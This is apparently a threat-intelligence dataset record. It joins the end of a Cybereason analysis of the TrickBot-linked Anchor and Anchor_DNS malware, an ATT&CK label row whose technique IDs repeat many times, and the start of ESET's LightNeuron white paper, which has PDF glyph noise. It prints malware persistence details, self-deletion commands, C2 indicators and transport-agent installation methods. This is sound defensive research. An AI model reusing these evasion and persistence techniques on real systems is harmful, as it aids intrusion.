`PDB PATH: C:\simsim\anchorDNS.v5\Bin\x64\Release\anchorDNS_x64.pdb
Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.
Multiple typos and grammatical mistakes in the Anchor_DNS code.
The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer. The following example shows considerable changes in the code of the WinMain() function between an older variant of Anchor_DNS and the new variant.
Anchor_DNS was able to stay under-the-radar by using specific execution flags. If these command-line arguments are not supplied, the Anchor_DNS terminates.
-i flag:
creates a scheduled task with the following naming convention (e.g “Notepad++ autoupdate#94654”): [random folder name in %APPDATA%] autoupdate#[random_number]
Writes NTFS ADS files ($TASK, $GUID, $FILE)
Alternate Data Stream
ADS Contents
Decoded Contents
edskype.exe:$FILE
QzpcVXNlcnNcdXNlclxBcHBEYXRhXFJvYW1pbmdcU2t5cGVcZWRza3lwZS5leGU=
C:\Users\user\AppData\Roaming\Skype\edskype.exe
edskype.exe:$TASK
Tm90ZXBhZCsrIGF1dG91cGRhdGUjOTQ2NTQ
Notepad++ autoupdate#94654
edskype.exe:$GUID
[BASE64]
/anchor_dns/[COMPUTER_NAME]_[Windows_Version].[clientID]/
-u flag:
New Variant: executes the malware’s main communication module with the C2
Old Variant:
Drops a copy in %TEMP%
Creates ADS files ($GUID, $FILE)
-s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.
--log=: expects a file name to write log file in C:\Users\[USER]
Contents of the debug file created by Anchor_DNS.
C2 Communication
Older and newer versions of Anchor_DNS communicate over DNS. However, the newer version described here does not check Internet connectivity using legitimate online web services like ipinfo.io, and instead uses a built-in capability to check for the server’s availability using the ICMP protocol.
Determining C2 server connectivity.
DNS Tunneling
Anchor_DNS communicates with the C2 servers over DNS using DNS Tunneling. With this technique, Anchor_DNS can transfer data, receive commands, and download an additional payload, as detailed in NTT Security’s report on an older Anchor_DNS sample.
By implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS traffic.
Example of DNS Tunneling traffic generated by Anchor_DNS.
Discovery of The Anchor Malware and Its Connection to TrickBot
During our investigation, we found several unidentified malware samples related to TrickBot infections. The malware is dubbed Anchor by its authors and has been active since August 2018. Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS. However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.
Earliest Anchor sample observed (SHA-1:3ed09498214d93c9ec14a15286546d242ad58943)
PDB path for the earliest Anchor sample found.
Many Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.
List of Anchor payloads found on VirusTotal with 0/0 detection rate.
The malware has both x86 and x64 versions and contains an installer component to install the malware.
Payload Name
Hash
PDB Path
anchorInstaller_x86
3ed09498214d93c9ec14a15286546d242ad58943
4bba60ff11f8b150b004960c658ad74a707ebcea
D:\MyProjects\secondWork\Anchor\Win32\Release\anchorInstaller_x86.pdb
C:\Users\ProFi\Desktop\data\Win32\anchorInstaller_x86Code\anchorInstaller_x86.pdb
anchorInstaller_x64
e75983b073ff0632e35e237f6622466c2699687c
Anchor_x86
Bd26238fb7d7e16ea79073d882bba00d34dd859c
F3683a0c12154e8bf44d9d942db3eac9e930e7a5
9ebb541dcb24d564448a6f5e00c613b73eba7148
D:\MyProjects\secondWork\Anchor\Win32\Release\Anchor_x86.pdb
C:\Users\ProFi\Desktop\data\Win32\anchorInstaller_x86Code\Anchor_x86.pdb
D:\Anchor\Anchor\Win32\Release\Anchor_x86.pdb
Anchor_x64
46c595e580719a4c54f55b4041f81d6e50ab4062
e5dc7c8bfa285b61dda1618f0ade9c256be75d1a
D:\Anchor\x64\Debug\Anchor_x64.pdb
C:\[JOB]\Anchor\x64\Release\Anchor_x64.pdb
The Anchor payload is delivered by AnchorInstaller AnchorInstaller unpacks the Anchor DLL and drops it in the %SYSTEMROOT% or %SYSTEMROOT%\System32 folder. The dropped DLL is loaded by the service netTcpSvc, which is created by the malware.
Anchor service persistence found in the registry.
NTFS ADS File - Storing the GUID
Similar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:
Anchor GUID stored as an NTFS ADS.
Unlike Anchor_DNS, which stores the information in Base64, Anchor’s GUID is saved in cleartext.
Self Deletion
Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:
cmd.exe /c timeout 1 && del C:\Users\[USER]\[SAMPLE_LOCATION]""
cmd.exe /C PowerShell 'Start-Sleep 5; Remove-Item C:\Users\[USER]\[SAMPLE_LOCATION]'
C2 Communication
Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers. It uses the following hardcoded web services to test connectivity:
Once it has established connectivity, it communicates with a set of hardcoded C2 servers.
Communication with a set of hardcoded C2 servers.
The request and response follow the same C2 communication format as TrickBot.
The request and response format for Anchor.
Connecting Anchor / Anchor_DNS to TrickBot
Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads. There are also several other similarities noted below.
GUID Generation Function
The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot. The GUID follows this pattern:
[Machine_NAME]_[Windows_Version].[Client_ID]
Malware Name
GUID
Anchor_DNS
/anchor_dns/MACHINE-001_W617601.D4CB942AA18EFF519DCBCAE88A0A99FB/
Anchor
/anchor001/jujubox-PC_W617601.6E8516CA48318FB2904E2027B5350B26
Trickbot
/mor49/DAVID-PC_W10017134.55C60B5D13499341D72F5A34C632CFD9
External IP Check Web Services
Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine. The same list is also used by TrickBot:
checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.
In certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.
Shared C2 Infrastructure
TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure. However, in some instances of this attack, there was C2 server overlap between these infrastructures. For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:
Anchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)
Connection to TrickBot
This above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker, and Mimikatz.
Connection to Anchor_DNS
The same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.
Passive DNS information of 23.95.97[.]59 , taken from VirusTotal.
Comparison Between Anchor Malware Family
The following table gives a comparison between different malware in the Anchor malware family.
Features
Anchor
Old Anchor_DNS
New Anchor_DNS
Earliest Observed Sample
August 2018
May 2019
November 2019
Command-line arguments?
-
+
+
Self-Deletion
+
+
-
Network Connectivity check via ICMP
-
-
+
Network Connectivity check via web services
+
+
-
NTFS ADS files
+
+
+
TrickBot’s GUID Generation pattern
+
(Cleartext)
+
(base64)
+
(base64)
Code Obfuscation
Very Little
Very Little
Obfuscated Code
C2 Communication Protocols
HTTP(S)
DNS
ICMP, DNS
Rise of Signed Malware
Code signing is meant to provide a level of credibility and integrity to a binary from the developer, and to guarantee that the binary has not been tampered with. In the past, signing malware was a practice mostly seen with nation-state threat actors. However, this is no longer the case. Nowadays, more and more commodity malware are being signed with valid certificates, effectively bypassing some security solutions that grant trust to signed binaries.
Malicious files in this attack were signed by:
Biller FIN Oy
NIRMAL 0013 Limited
BRO-BURGER, LLC
TrickBot payloads and Anchor / Anchor_DNS payloads were at times signed by the same signer, which further demonstrate that these malware are most likely used by the same threat actor.
In searching for additional signed known and unknown files, we were able to identify dozens of malware samples signed by the same organizations. Some were also signed with the same serial number.
Biller FIN Oy Signer:
A VirusTotal Signer name search shows malware associated with these campaigns:
A VirusTotal Serial Number search shows malware associated with the campaigns:
Conclusion
This research gives a detailed step-by-step analysis of recent attacks targeting the financial, manufacturing, and retail sectors across the United States and Europe. These attacks start with a TrickBot infection and, with high-profile targets, can escalate to a hacking operation leveraging a new malware, Anchor, and a new variant of Anchor_DNS.
Unlike previously reported TrickBot attacks that resulted in mass ransomware infections, these new attacks focus on stealing sensitive information from POS systems and other sensitive resources in the victims’ network by compromising critical assets.
In addition, Cybereason discovered a previously undocumented malware called Anchor as well as a new variant of the recently discovered Anchor_DNS malware. Both Anchor and Anchor_DNS are directly related to TrickBot infections and have code similarities, and sometimes also share C2 infrastructure with TrickBot. Anchor_DNS uses various techniques to keep itself under-the-radar, such as communication over DNS, and the reliance on specific command-line arguments in order to run properly. Through these techniques, it is able to evade many security products including certain sandboxes and AV vendors.
These attacks stress the danger of commodity malware infections that sometimes may be underestimated due to their frequent use and high volume. It is important to note that, in this attack, once an endpoint is infected with TrickBot it is up to the attackers to decide their next move. If they identify a high-value target, they can go beyond the traditional information stealing capabilities of TrickBot and use the target machine as an entry point to other machines on the network.
This research does not focus on the attribution of these attacks. However, through analysis of the evidence and context presented in our research, we noticed certain TTP overlaps
with earlier attacks that were attributed
to the financially-motivated FIN6 threat actor. We leave it to our readers to draw their own conclusions on the attribution of these attacks.
Lastly, these attacks show how threat actors are shifting toward signed malware more than ever before. As this trend continues to evolve, security practitioners and security vendors must improve the detection of signed malware and re-think the trust given to signed binaries in general.
The best way to defend against an attack like this is to use an iterative security process. Read more in our white paper.
Indicators of Compromise
For a comprehensive list of indicators of compromise, please see the PDF file for this attack here.
MITRE ATT&CK Techniques
Initial Access
Execution
Persistence
Privilege Escalation
Defense Evasion
Credential Access
Discovery
Collection
Exfiltration
C&C
Spearphishing Link
User Execution
Scheduled Task
Scheduled Task
Modify Registry
Credentials from Web Browsers
Query Registry
Clipboard Data
Exfiltration Over Alternative Protocol
Data Encoding
Scheduled Task
Browser Extensions
Bypass User Account Control
Code Signing
Brute Force
System Information Discovery
Data Obfuscation
Execution through API
Process Injection
Access Token Manipulation
Process Injection
Private Keys
Permission Groups Discovery
Standard Application Layer Protocol
Command-Line Interface
Deobfuscate/Decode Files or Information
Credential Dumping
Account Discovery
Remote File Copy
PowerShell
Bypass User Account Control
Domain Trust Discovery
Uncommonly Used Port
Rundll32
Masquerading
Commonly Used Port
Scripting
NTFS File Attributes
Windows Management Instrumentation
Access Token Manipulation
Execution through Module Load
Share
About the Author
Cybereason Nocturnus
The Cybereason Nocturnus Team has brought the world’s brightest minds from the military, government intelligence, and enterprise security to uncover emerging threats across the globe. They specialize in analyzing new attack methodologies, reverse-engineering malware, and exposing unknown system vulnerabilities. The Cybereason Nocturnus Team was the first to release a vaccination for the 2017 NotPetya and Bad Rabbit cyberattacks.
All Posts by Cybereason Nocturnus
Related Posts
Operation GhostShell: Novel RAT Targets Global Aerospace and Telecoms Firms
The highly-targeted attacks against aerospace and telecoms firms by new Iranian threat actor MalKamak includes newly discovered malware that evaded security tools since 2018 and abuses Dropbox services for command and control...
THREAT ANALYSIS REPORT: All Paths Lead to Cobalt Strike - IcedID, Emotet and QBot
The Cybereason GSOC delivers details on three recently observed attack scenarios where fast-moving malicious actors used the malware loaders IcedID, QBot and Emotet to deploy the Cobalt Strike framework on the compromised systems...
Subscribe
Never miss a blog.
Latest from Our CEO Series
Recent Posts
Malicious Life Podcast: Hackers vs. Spies - The Stratfor Leaks Part 2
June 17, 2022
How AI-Driven XDR Defeats Ransomware
June 15, 2022
Defending Against the Five Stages of a Ransomware Attack
June 14, 2022
Categories
Research
Podcasts
Webinars
Resources
Videos
News
All Posts
Related Posts
Operation GhostShell: Novel RAT Targets Global Aerospace and Telecoms Firms
The highly-targeted attacks against aerospace and telecoms firms by new Iranian threat actor MalKamak includes newly discovered malware that evaded security tools since 2018 and abuses Dropbox services for command and control...
THREAT ANALYSIS REPORT: All Paths Lead to Cobalt Strike - IcedID, Emotet and QBot
The Cybereason GSOC delivers details on three recently observed attack scenarios where fast-moving malicious actors used the malware loaders IcedID, QBot and Emotet to deploy the Cobalt Strike framework on the compromised systems...
NEWSLETTER
Never miss a blog
Get the latest research, expert insights, and security industry news.
Subscribe
About
Who We Are
Careers
Leadership
Contact
Resources
Blog
Case Studies
Webinars
White Papers
Platform
Overview
Endpoint Protection
EDR
MDR
©Cybereason 2022. All Rights Reserved.
Terms of Use
Privacy Notice
Security
",[]
https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf,"['enterprise-attack', 'Enterprise']",['persistence'],"['Transport Agent', 'Application Layer Protocol: Mail Protocols', 'Archive Collected Data', 'Automated Collection', 'Automated Exfiltration', 'Command and Scripting Interpreter: Windows Command Shell', 'Data from Local System', 'Data Manipulation: Transmitted Data Manipulation', 'Data Obfuscation: Steganography', 'Data Staged: Local Data Staging', 'Deobfuscate/Decode Files or Information', 'Email Collection: Remote Email Collection', 'Encrypted Channel: Symmetric Cryptography', 'Exfiltration Over C2 Channel', 'Indicator Removal on Host: File Deletion', 'Ingress Tool Transfer', 'Masquerading: Match Legitimate Name or Location', 'Native API', 'Obfuscated Files or Information', 'Scheduled Transfer', 'Server Software Component: Transport Agent', 'System Information Discovery', 'System Network Configuration Discovery']","['T1505.002', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016', 'T1071', 'T1560', 'T1119', 'T1020', 'T1059', 'T1005', 'T1565', 'T1001', 'T1074', 'T1140', 'T1114', 'T1573', 'T1041', 'T1070', 'T1105', 'T1036', 'T1106', 'T1027', 'T1029', 'T1505', 'T1082', 'T1016']","TURLA
LIGHTNEURON
One email away from
remote code execution
ESET Research White papers // May 2019
Matthieu Faou,TABLE OF CONTENTS
1. Executive summary
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
4
2. Attacker profile
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
5
2.1 Publicized high-profile attacks
.
.
.
.
.
.
.
.
.
.5
2.2 Victimology
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
. 5
2.3 Tools and tactics
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.5
3. Overview
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
6
3.1 Impact
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
. 6
3.2 Chronology
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
6
3.3 Targeting
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
. 7
3.4 Attribution to Turla
.
.
.
.
.
.
.
.
.
.
.
.
.
.7
3.5 Insight into attackers activity .
.
.
.
.
.
.
.
.
.
.8
4. Malware
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
9
4.1 Microsoft Exchange architecture
.
.
.
.
.
.
.
.
.9
4.2 Malicious Transport Agent .
.
.
.
.
.
.
.
.
.
.
11
4.3 Companion Dynamic Link Library
.
.
.
.
.
.
.
.
14
4.4 Evolution
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
28
4.5 Linux variant
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
28
5. Remediation
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
28
5.1 Cleaning
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
28
5.2 Mitigations
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
30
6. Conclusion
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
30
7. Bibliography
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
31
8. IoCs
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
32
8.1 Hashes
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
32
8.2 Paths
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
.
33
9. MITRE ATT&CK techniques .
.
.
.
.
.
.
.
.
.
.
.
.
33
LIST OF TABLES
Table 1
Description of the handlers implemented in the DLL
18
Table 2
Handler return codes and their descriptions
19
Table 2
List of instruction codes
24
Table 3
Description of the log files
26,LIST OF FIGURES
Figure 1
Timeline of important attacks attributed to Turla
5
Figure 2
LightNeuron timeline
6
Figure 3
Map of known LightNeuron victims
7
Figure 4
Operators working hours
8
Figure 5
Distribution of the backdoor commands used by the operators
9
Figure 6
Microsoft Exchange architecture
10
Figure 7
Classes implemented by the Transport Agent
11
Figure 8
PowerShell script to install the malicious Transport Agent
11
Figure 9
SmtpReceiveAgent implementation
12
Figure 10
Process
function
13
Figure 11
LightNeuron Transport Agent
14
Figure 12
Some decrypted strings
15
Figure 13
Partially redacted, decrypted configuration example
16
Figure 14
Redacted example of a rule file
18
Figure 15
Decompilation output of the zip handler function
19
Figure 16
Original email (on the left) and email after
the call to changeSubject (on the right)
20
Figure 17
Attachment type check (HexRays output)
20
Figure 18
Extraction of the container data
from the PDF (HexRays output)
21
Figure 19
Representation in hexadecimal of a PDF containing a container
21
Figure 20
Modified PDF document with embeded
commands for LightNeuron
Snake is another name for Turla
21
Figure 21
Validation of the JPG signature (HexRays output)
22
Figure 22
Modified JPG picture with embedded commands
for LightNeuron
23
Figure 23
Hexadecimal dump of an encrypted container
23
Figure 24
Hexadecimal dump of a decrypted container
23
Figure 25
Structure of the command container (C-like syntax)
24
Figure 26
Example of an email generated by LightNeuron
to send command output
25
Figure 27
Log entry structure in C-like syntax
26
Figure 28
Exfiltration loop with night check (HexRays output)
27
Figure 29
Exfiltration loop (HexRays output)
27
Figure 30
Linux strings in the Windows DLL
28
Figure 31
agents.config
example
29,Turla LightNeuron
One email away from remote code execution4
1.
EXECUTIVE SUMMARY
Turla, also known as Snake, is one of oldest, still-active cyberespionage groups, with more than a decade
of experience. Its operators mainly focus on high-profile targets such as governments and diplomatic
entities in Europe, Central Asia and the Middle East. They are known for having breached major organiza -
tions such as the US Department of Defense in 2008 and the Swiss defense company RUAG in 2014. More
recently, several European countries including France and the Czech Republic went public to denounce
Turla’s attacks against their governments.
To perform these operations, Turla’s operators own a large arsenal of malware including a rootkit,
several complex backdoors (with a notable one for Microsoft Outlook), and a large range of tools to pivot
on a network.
In this white paper, we present the analysis of LightNeuron, a backdoor specifically designed to target
Microsoft Exchange mail servers.
Key points in this white paper:
• Turla is believed to have used LightNeuron since at least 2014.
• LightNeuron is the first publicly known malware to use a malicious Microsoft Exchange Transport Agent.
• LightNeuron can spy on all emails going through the compromised mail server.
• LightNeuron can modify or block any email going through the compromised mail server.
• LightNeuron can execute commands sent by email.
• Commands are hidden in specially crafted PDF or JPG attachments using
steganography
.
• LightNeuron is hard to detect at the network level because it does not use standard HTTP(S)
communications.
• LightNeuron was used in recent attacks against diplomatic organizations in Eastern Europe
and the Middle East.
For any inquiries, or to make sample submissions related to this white paper, contact us at:
threatintel@eset com
,Turla LightNeuron
One email away from remote code execution5
2.
ATTACKER PROFILE
Turla, also known as Snake, is an infamous espionage group active for at least a decade. The group
is well known for its advanced custom tools and its ability to run highly targeted operations.
2.1
Publicized high-profile attacks
Over the past ten years, Turla has been responsible for numerous high-profile breaches. The targets include
the United States Central Command in 2008
[1], the Swiss military company RUAG in 2014
[2] and more
recently, the French Armed Forces in 2018
[3]. The timeline in Figure 1 presents some of the major attacks
attributed to Turla.
/two.tnum_lnum/zero.pnum_lnum/zero.pnum_lnum/eight.pnum_lnum
US Central
Command/two.tnum_lnum/zero.pnum_lnum/one.pnum_lnum/three.pnum_lnum
Finnish Foreign
Ministry/two.tnum_lnum/zero.pnum_lnum/one.pnum_lnum/four.pnum_lnum
RUAG Defense
Company /two.tnum_lnum/zero.pnum_lnum/one.pnum_lnum/seven.pnum_lnum
German Foreign
Oﬃce/two.tnum_lnum/zero.pnum_lnum/one.pnum_lnum/eight.pnum_lnum
French Armed
Forces
Figure 1
// Timeline of important attacks attributed to Turla
2.2 Victimology
As opposed to some other APT (Advanced Persistent Threat) groups, Turla is far from being opportunistic
in the selection of its targets. The group is interested in collecting information from strategic people
or organizations. In addition, to our knowledge, Turla has never conducted cybersabotage operations,
such as those made by GreyEnergy
[4] or TeleBots [5].
With several years of tracking this espionage group, we have identified the most at-risk types
of organizations:
• Ministries of Foreign Affairs and diplomatic representations (embassies, consulates, etc.)
• Military organizations
• Regional political organizations
• Defense contractors
Most parts of the world are targeted by Turla’s operations, with the exception, perhaps, of Eastern Asia.
Moreover, over the past few years, we have noticed that geographical areas of conflict, such as Eastern
Europe and the Middle East, are under heavy attacks from this APT group. However, even with this new
focus, they did not abandon their traditional targets in Western Europe and Central Asia.
2.3
Tools and tactics
The usual modus operandi used by Turla’s operators is to use basic first-stage malware for initial recon -
naissance. In some cases they even use generic tools such as Metasploit
[6] [7]. Once they deem the victim
interesting enough, they switch to more advanced malware such as Carbon
[8] or Gazer [9].
The initial compromise is generally tailored towards specific types of victims. In the past, they mainly relied
on spearphishing emails [10], watering hole attacks [11] or Man-in-the-Middle attacks
[12].
After this initial compromising step, they move laterally on the network and collect many credentials.
To avoid suspicious communications to the internet, they developed tools such as DarkNeuron
[13] and
RPCBackdoor, to forward commands and exfiltrate data on the local network. They also regularly create
user accounts that they use later if they lose access to a compromised machine. It means that once compro -
mised, it is very hard to eject the attacker from the network without rebuilding most of it.
Finally, collected data is exfiltrated through various channels such as HTTP and emails. They usually rely on
compromised web servers as first stage servers. They are also known for using SATCOM IP addresses to hide
the real destination of the traffic
[14].,Turla LightNeuron
One email away from remote code execution6
Turla’s operators have a wide arsenal at their disposal for all major desktop platforms: Windows, macOS
and Linux. Some of their tools stand out for their complexity, such as the Snake rootkit, which relies on
a vulnerable VirtualBox driver to bypass Windows Driver Signature Enforcement
[15]. Some others stand
out by their originality, such as the Outlook backdoor we analyzed in 2018
[16].
During our several years of tracking Turla activities, we also noticed that they were reacting quickly to both
publication and detection. Apparently, they do not hesitate to clean all the traces and potentially lose
control of a machine if they feel they will be detected soon. They probably do not want their more-advanced
malware to be exposed publicly.
3.
OVERVIEW
LightNeuron is a piece of malware specifically designed to target Microsoft Exchange servers. It has two
facets: spying on emails and acting as a full-feature backdoor.
3.1 Impact
While rootkits and bootkits have an unmatched stealthiness in the malware domain, LightNeuron is uncom -
monly stealthy for “regular” malware. To our knowledge, leveraging a Microsoft Exchange Transport Agent
for persistence is something unique and never before seen. Moreover, in the few cases we studied, Light -
Neuron was running with SYSTEM privileges. It is typically hard to gain this level of privilege on a Microsoft
Exchange server, as it is one of the most critical assets in an organization. Thus, once compromised, it is likely
that it will stay undetected for months or years.
The Command and Control protocol is fully based on emails and uses steganography to store data in PDF
and JPG attachments. Given that, in the Microsoft Exchange architecture, the malware is installed at the
same level as anti-spam and other email security solutions, it allows the malware to bypass them easily.
Using a nearly undetectable Command and Control channel allows the malware to stay under the radar
for a long period.
During the course of our investigation, we noticed alongside LightNeuron the presence of several tools used
to control other machines on the local network. These tools include Remote Administration Software, RPC-
based malware or .NET web shells targeting Outlook Web Access. By leveraging them, attackers are able to
control other machines on the local network using emails sent to the Exchange server. This strategy allows
avoiding typical, noisy methods such as an HTTP-based C&C protocol or connection via RDP from outside
the compromised network.
3.2 Chronology
We believe that LightNeuron development started before 2014 as the versions compiled in 2014, according
to the compilation timestamp, appear to be in a late development state. Even if the development occurred
several years ago, LightNeuron is still used in recent compromises. Figure 2 is a timeline of some important
events related to LightNeuron.
/two.tnum_lnum/zero.pnum_lnum/one.pnum_lnum/four.pnum_lnum
June
Oldest compilation
timestamp
/two.tnum_lnum/zero.pnum_lnum/one.pnum_lnum6
October
Most recent
compilation
timestamp
/two.tnum_lnum/zero.pnum_lnum/one.pnum_lnum/seven.pnum_lnum
May
Compromise
of an organization
in the Middle East
/two.tnum_lnum/zero.pnum_lnum/one.pnum_lnum8
October
Compromise
of an organization
in Eastern in Europe
Figure 2
// LightNeuron timeline,Turla LightNeuron
One email away from remote code execution7
3.3 Targeting
These targets are in line with traditional Turla targets. Figure 3 shows the geographical location of the
identified targets. The Eastern European and Middle East targets are diplomatic organizations. Regarding
the Brazilian target, the sample was uploaded to VirusTotal. Thus, we cannot know the exact nature
of the victim or even be sure that the victim was based in Brazil.
Brazil
Unknown organization
Eastern Europe
Ministry of Foreign Aﬀairs
Middle East
Regional Diplomatic
organization
Figure 3
// Map of known LightNeuron victims
3.4
Attribution to Turla
We believe with high confidence that Turla operates LightNeuron. The following artefacts we collected
during our investigation back this:
• On one compromised Exchange server:
• A PowerShell script containing malware previously attributed to Turla was dropped 44 minutes before
a PowerShell script used to install LightNeuron.
• Both scripts were located in
C:\windows\system32
.
• The script used to install LightNeuron has a filename
msinp.ps1
that looks like typical filenames
used by Turla.
• On another compromised server, we saw a sample of the IntelliAdmin Remote Administration Tool,
packed with a packer used only by Turla, being dropped by LightNeuron.
• For each LightNeuron attack, we found several other instances of Turla malware on the same network.
• The email address used by the attackers was registered at GMX and was impersonating an employee
of the targeted organization. This same provider was used for the Outlook backdoor
[16] and for
a previously undocumented PowerShell backdoor we have dubbed PowerStallion.
• Kaspersky Labs researchers attribute LightNeuron, with medium confidence, to Turla
[17].,Turla LightNeuron
One email away from remote code execution8
3.5
Insight into attackers activity
While analyzing a compromised asset, we were able to retrace part of the attackers’ activities. In particular,
we were able to map the working hours of the operators, using the time at which the compromised Exchange
server received emails containing commands for the backdoor.
Our first observation is that the activity matches well a typical 9-to-5 workday in the UTC+3 time zone,
as shown in Figure 4.
/three.pnum_lnum/zero.pnum_lnum
/two.pnum_lnum/zero.pnum_lnum
/one.pnum_lnum/zero.pnum_lnum
/zero.pnum_lnum
/two.pnum_lnum/four.pnum_lnum/six.pnum_lnum/eight.pnum_lnum/one.pnum_lnum/zero.pnum_lnum/one.pnum_lnum/two.pnum_lnum/one.pnum_lnum/four.pnum_lnum/one.pnum_lnum/six.pnum_lnum/one.pnum_lnum/eight.pnum_lnum/two.pnum_lnum/zero.pnum_lnum/zero.pnum_lnum
UTC +/three.pnum_lnum timezoneUTC timezone
HourNumber
of email received
Figure 4
// Operators working hours
Our second observation is that no activity was observed between December 28, 2018 and January 14, 2019,
while previously and afterwards, the attackers sent several emails per week. This break in activities corresponds
to holidays around the Orthodox Christmas.
Even if it is not sufficient for a strong attribution, one might correlate these two observations with other
artefacts used for attribution.
We also compiled the type of commands used by the attackers, as shown in Figure 5. Even if we were
not able to retrieve the command arguments, it is already a good insight into the operators’ goals.
It turns out that LightNeuron is used mostly to exfiltrate data. The remaining activity is most likely dropping
and executing tools to perform lateral movements across the local network.,Turla LightNeuron
One email away from remote code execution9
Exﬁltrate a ﬁle
Execute
a command line
Drop a ﬁle
and execute it
Figure 5
// Distribution of the backdoor commands used by the operators
4.
MALWARE
Two main components comprise LightNeuron: a Transport Agent
[18], registered in the Microsoft Exchange
configuration, and a companion 64-bit Dynamic Link Library (DLL) containing most of the malicious code.
4.1
Microsoft Exchange architecture
Microsoft Exchange allows extending its functionalities using Transport Agents that can process and modify
all email messages going through the mail server
[18]. Transport Agents can be created by Microsoft,
third-party vendors, or directly within an organization.
They have many legitimate purposes, such as:
• Filtering spam
• Filtering malicious emails/attachments
• Adding a corporate signature at the end of every email
The typical events handled by a Transport Agent occur when the mail server sends or receives an email.
Before the event is actually executed, the Transport Agents are called and have the possibility to modify
or block the email.
Figure 6 shows the typical workflow in a Microsoft Exchange server. It also shows where the malicious
Transport Agents are inserted in this flow.,Turla LightNeuron
One email away from remote code execution10
Protocol Agents
LightNeuron
SMTP Receive Agent
Pickup & Replay
directoriesRouting Agents
LightNeuron
Routing AgentProtocol Agents
Hub Selector
SMTP from the
Transport service
or the Mailbox
Transport service
on other Mailbox
Servers
FROM
SMTP to the
Transport service
or the Mailbox
Transport service
on other Mailbox
Servers
TO
Submission
QueueDelivery
Queue
Front End Transport Service
Transport ServiceClient
Access
Server
Mailbox
Server
Mailbox Transport
Submission serviceMailbox transport
Delivery serviceCategorizerSMTP Receive
SMTP Receive
SMTP Receive
Mailbox Assistants
Mailbox Submit AgentsStore Driver Submit
Mailbox deliver Agents
Mailbox Transport Service
SMTP to the
Transport service
on other Mailbox
Servers
FROM
SMTP to the
Transport service
on other Mailbox
Servers
TO
Store Driver Deliver
Hub SelectorSMTP SendExternal SMTP
SMTP
SMTP Send
SMTP
SMTP Send
SMTP
RPCRPC
Mailbox
database
Figure 6
// Microsoft Exchange architecture
(original picture: https://docs microsoft com/en-us/exchange/mail-flow-exchange-2013-help )
In order to register a Transport Agent to a Microsoft Exchange Installation, one could modify the list
of agents in
<ExchangeInstallFolder>\TransportRoles\Agents\agents.config
. The PowerShell
function
Install-TransportAgent
is another way to register a new Transport Agent.,Turla LightNeuron
